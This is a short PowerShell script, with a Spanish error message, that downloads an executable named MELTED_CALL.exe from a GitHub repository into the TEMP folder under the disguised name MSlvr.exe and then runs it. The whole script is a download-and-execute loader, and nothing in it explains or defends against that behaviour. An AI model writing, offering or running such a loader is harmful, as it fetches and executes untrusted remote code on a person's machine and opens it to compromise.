$url = "https://github.com/Jabato96/POCAHK/raw/main/MELTED_CALL.exe"
$output = "$env:TEMP\MSlvr.exe"


Invoke-WebRequest -Uri $url -OutFile $output


if (Test-Path $output) {
    
    Invoke-Expression $output
} else {
    Write-Host "El archivo no se descargó correctamente."
}
